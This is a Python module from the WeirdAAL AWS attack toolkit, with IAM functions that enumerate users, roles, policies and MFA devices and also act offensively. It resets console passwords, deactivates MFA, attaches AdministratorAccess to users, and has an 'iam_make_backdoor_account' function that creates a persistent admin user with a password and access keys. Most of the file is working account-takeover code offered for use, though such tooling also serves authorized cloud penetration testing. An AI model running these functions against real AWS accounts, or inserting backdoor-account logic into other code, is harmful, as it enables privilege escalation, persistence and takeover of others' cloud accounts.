'''
IAM functions for WeirdAAL
'''

import boto3
import botocore
import json
import logging
import os
import pprint
import sys
import urllib

pp = pprint.PrettyPrinter(indent=5, width=80)

region = 'us-east-1'
regions = ['us-east-1']

'''
Code to get the AWS_ACCESS_KEY_ID from boto3
'''
session = boto3.Session()
credentials = session.get_credentials()
AWS_ACCESS_KEY_ID = credentials.access_key


def check_root_account():
    client = boto3.client('iam',region_name=region)

    try:
        acct_summary = client.get_account_summary()
        if acct_summary:
            print("Root Key!!! [or IAM access]")
            print("Printing Account Summary")
            pp.pprint(acct_summary['SummaryMap'])
        client_list = client.list_users()
        if client_list:
            print("Printing Users")
            pp.pprint(client_list['Users'])

        print("Checking for console access")
        for user in client_list['Users']:

            try:
                profile = client.get_login_profile(UserName=user['UserName'])
                if profile:
                    print('User {} likely has console access and the password can be reset :-)' .format(user['UserName']))
                    print("Checking for MFA on account")
                    mfa = client.list_mfa_devices(UserName=user['UserName'])
                    print(mfa['MFADevices'])

            except botocore.exceptions.ClientError as e:
                if e.response['Error']['Code'] == 'NoSuchEntity':
                    print("[-]: user '{}' likely doesnt have console access" .format(user['UserName']))
                else:
                    print("Unexpected error: {}" .format(e))

    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("The AWS KEY IS INVALID. Exiting")
        if e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Is NOT a root key' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_change_user_console_password(username, password):
    client = boto3.client('iam', region_name=region)

    try:
        response = client.update_login_profile(UserName=username,Password=password, PasswordResetRequired=False)
        print('Changing password for user: {} to password: {}' .format(username, password))
        # print(response)
        print('Response to password change was: {}' .format(response['ResponseMetadata']['HTTPStatusCode']))
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'PasswordPolicyViolation':
            print("Password policy violation. Manually check password policy")
        elif e.response['Error']['Code'] == 'NoSuchEntity':
            print("[-]: User likely doesnt have console access")
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")


def iam_create_user_console_password(username, password):
    client = boto3.client('iam', region_name=region)

    try:
        response = client.create_login_profile(UserName=username,Password=password, PasswordResetRequired=False)
        print('Changing password for user: %s to password: {}' .format(username, password))
        print('Response to password change was: {}' .format(response['ResponseMetadata']['HTTPStatusCode']))
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'PasswordPolicyViolation':
            print("Password policy violation. Manually check password policy")
        elif e.response['Error']['Code'] == 'NoSuchEntity':
            print("[-]: User likely doesnt have console access")
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")


def get_password_policy():
    client = boto3.client('iam', region_name=region)

    try:
        pass_policy = client.get_account_password_policy()
        print("Account Password Policy:")
        pp.pprint(pass_policy['PasswordPolicy'])
    except botocore.exceptions.ClientError as e:
        print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_create_user(username):
    client = boto3.client('iam', region_name=region)

    try:
        print("Creating a new IAM user named: {}" .format(username))
        create_user = client.create_user(Path='/',UserName=username)
        print('Response to create user was: {}' .format(create_user['ResponseMetadata']['HTTPStatusCode']))
        print("New User Details")
        pp.pprint(create_user['User'])
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'EntityAlreadyExists':
            print("ERROR: The provided user: {} already exists" .format(username))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_create_access_key(username):
    client = boto3.client('iam', region_name=region)

    try:
        create_access_key = client.create_access_key(UserName=username)
        print("Creating a new access key for: {}" .format(username))
        pp.pprint(create_access_key['AccessKey'])
    except botocore.exceptions.ClientError as e:
        print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_delete_access_key(username, accesskey):
    client = boto3.client('iam', region_name=region)

    try:
        delete_access_key = client.delete_access_key(UserName=username, AccessKeyId=accesskey)
        print("Deleting a access key: {} for: {}" .format(accesskey, username))
        print('Response to delete key was: {}' .format(delete_access_key['ResponseMetadata']['HTTPStatusCode']))
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'NoSuchEntity':
            print("ERROR: The provided AccessKey doesnt exist")
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

#untested :-/ but should work #TODO
def iam_delete_mfa_device(username, mfaserial):
    client = boto3.client('iam', region_name=region)
    try:
        delete_mfa = client.deactivate_mfa_device(UserName=username, SerialNumber=mfaserial)
        print("Deleting MFA device: {} for: {}" .format(mfaserial, username))
        print('Response to delete MFA devices was: {}' .format(delete_mfa['ResponseMetadata']['HTTPStatusCode']))
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'NoSuchEntity':
            print("ERROR: The provided AccessKey doesnt exist")
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_list_mfa_device(username):
    client = boto3.client('iam', region_name=region)
    try:
        response = client.list_mfa_devices(UserName=username)
        # print(response)
        if response.get('MFADevices') is None:
            print("{} likely does not have IAM permissions\n" .format(AWS_ACCESS_KEY_ID))
        elif len(response['MFADevices']) <= 0:
            print("[-] ListMFADevices allowed for {} but no results [-]" .format(region))
        else:
            print("### MFA info for {} ###".format(username))
            for device in response['MFADevices']:
                pp.pprint(device)
        print("\n")

    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Does not have the required permissions' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_make_admin(username):
    client = boto3.client('iam', region_name=region)

    try:
        make_admin = client.attach_user_policy(UserName=username, PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        print("Adding admin policy to: {}" .format(username))
        print('Response to attaching admin policy was: {}' .format(make_admin['ResponseMetadata']['HTTPStatusCode']))
    #print('Response to delete key was: %s' % delete_access_key['ResponseMetadata']['HTTPStatusCode'])
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'AccessDenied':
            print("ERROR: Account does not have permissions to add the policy")
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_make_backdoor_account( username, password):
    client = boto3.client('iam', region_name=region)

    try:
        print("Making backdoor account with username: {}" .format(username))
        iam_create_user(username)
        iam_make_admin(username)
        iam_create_user_console_password(username, password)
        iam_create_access_key(username)

    except botocore.exceptions.ClientError as e:
        print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_list_groups():
    print("### Printing IAM Groups ###")
    try:
        for region in regions:
            client = boto3.client('iam', region_name=region)
            response = client.list_groups()
            if response.get('Groups') is None:
                print("{} likely does not have IAM permissions\n" .format(AWS_ACCESS_KEY_ID))
            elif len(response['Groups']) <= 0:
                print("[-] ListGroups allowed for {} but no results [-]\n" .format(region))
            else:
            # print(response)
                print ("### {} Groups ###" .format(region))
                for group in response['Groups']:
                    pp.pprint(group)
                print("\n")
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Is NOT a root key' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'OptInRequired':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_get_user():
    print("### Printing IAM User Info ###")
    try:
        for region in regions:
            client = boto3.client('iam', region_name=region)
            response = client.get_user()
            print(response)
            if response.get('User') is None:
                print("{} likely does not have IAM permissions\n" .format(AWS_ACCESS_KEY_ID))
            elif len(response['User']) <= 0:
                print("[-] GetUser allowed for {} but no results [-]\n" .format(region))
            else:
            # print(response)
                print ("### {} User Account Info ###" .format(region))
                for key, value in response['User'].items():
                    print(key,':', value)
                print("\n")
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Is NOT a root/IAM key' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'OptInRequired':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_get_account_summary():
    print("### Printing IAM Account Summary ###")
    try:
        for region in regions:
            client = boto3.client('iam', region_name=region)
            
            response = client.get_account_summary()
            # print(response)
            if response.get('SummaryMap') is None:
                print("{} likely does not have IAM permissions\n" .format(AWS_ACCESS_KEY_ID))
            elif len(response['SummaryMap']) <= 0:
                print("[-] GetAccountSummary allowed for {} but no results [-]\n" .format(region))
            else:
                pp.pprint(response['SummaryMap'])
                # print(response)
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Is NOT a root/IAM key' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'OptInRequired':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_list_users():
    print("### Printing IAM Users ###")
    try:
        for region in regions:
            client = boto3.client('iam', region_name=region)
            
            response = client.list_users()
            # print(response)
            if response.get('Users') is None:
                print("{} likely does not have IAM permissions\n" .format(AWS_ACCESS_KEY_ID))
            elif len(response['Users']) <= 0:
                print("[-] ListUsers allowed for {} but no results [-]\n" .format(region))
            else:
                pp.pprint(response['Users'])
                # print(response)
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Is NOT a root/IAM key' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'OptInRequired':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")


def iam_list_roles():
    print("### Printing IAM Roles ###")
    try:
        for region in regions:
            client = boto3.client('iam', region_name=region)
            
            response = client.list_roles()
            # print(response)
            if response.get('Roles') is None:
                print("{} likely does not have IAM permissions\n" .format(AWS_ACCESS_KEY_ID))
            elif len(response['Roles']) <= 0:
                print("[-] ListRoles allowed for {} but no results [-]\n" .format(region))
            else:
                for roles in response['Roles']:
                    print("Role Name: {}".format(roles['RoleName']))
                    pp.pprint(roles)
                    print('\n')
                # print(response)
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Is NOT a root/IAM key' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'OptInRequired':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")


def iam_list_policies():
    print("### Printing IAM Policies ###")
    try:
        for region in regions:
            client = boto3.client('iam', region_name=region)
            
            response = client.list_policies()
            # print(response)
            if response.get('Policies') is None:
                print("{} likely does not have IAM permissions\n" .format(AWS_ACCESS_KEY_ID))
            elif len(response['Policies']) <= 0:
                print("[-] ListPolicies allowed for {} but no results [-]\n" .format(region))
            else:
                for policy in response['Policies']:
                    print("Policy Name: {}".format(policy['PolicyName']))
                    pp.pprint(policy)
                    print('\n')
                # print(response)
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Is NOT a root/IAM key' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'OptInRequired':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

# dont use see below
def iam_list_user_policies(username):
    print("### Printing IAM Policies for {} ###".format(username))
    try:
        for region in regions:
            client = boto3.client('iam', region_name=region)
            
            response = client.list_user_policies(UserName=username)
            # print(response)
            if response.get('PolicyNames') is None:
                print("{} likely does not have IAM permissions\n" .format(AWS_ACCESS_KEY_ID))
            elif len(response['PolicyNames']) <= 0:
                print("[-] ListUserPolicies allowed for {} but no results [-]\n" .format(region))
            else:
                for policy in response['PolicyNames']:
                    print("Policy Name: {}".format(policy['PolicyName']))
                    pp.pprint(policy)
                    print('\n')
                # print(response)
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Is NOT a root/IAM key' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'OptInRequired':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_list_attached_user_policies(username):
    print("### Printing Attached IAM Policies for {} ###".format(username))
    try:
        for region in regions:
            client = boto3.client('iam', region_name=region)
            
            response = client.list_attached_user_policies(UserName=username)
            # print(response)
            if response.get('AttachedPolicies') is None:
                print("{} likely does not have IAM permissions\n" .format(AWS_ACCESS_KEY_ID))
            elif len(response['AttachedPolicies']) <= 0:
                print("[-] ListAttachedUserPolicies allowed for {} but no results [-]\n" .format(region))
            else:
                for policy in response['AttachedPolicies']:
                    #print("Policy Name: {}".format(policy['PolicyName']))
                    pp.pprint(policy)
                    print('\n')
                # print(response)
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Is NOT a root/IAM key' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'OptInRequired':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")

def iam_list_entities_for_policy(policy_arn):
    print("### Printing IAM Entity Policies for {} ###".format(policy_arn))
    try:
        for region in regions:
            client = boto3.client('iam', region_name=region)
            
            response = client.list_entities_for_policy(PolicyArn=policy_arn)
            print(response)

            #this needs a if data for PolicyGroups, PolicyUsers, PolicyRoles do stuff

            #if response.get('AttachedPolicies') is None:
            #    print("{} likely does not have IAM permissions\n" .format(AWS_ACCESS_KEY_ID))
            #elif len(response['AttachedPolicies']) <= 0:
            #    print("[-] ListAttachedUserPolicies allowed for {} but no results [-]\n" .format(region))
            #else:
            #    for policy in response['AttachedPolicies']:
            #        #print("Policy Name: {}".format(policy['PolicyName']))
            #        pp.pprint(policy)
            #        print('\n')
            #    # print(response)
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'InvalidClientTokenId':
            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'AccessDenied':
            print('{} : Is NOT a root/IAM key' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        elif e.response['Error']['Code'] == 'OptInRequired':
            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
        else:
            print("Unexpected error: {}" .format(e))
    except KeyboardInterrupt:
        print("CTRL-C received, exiting...")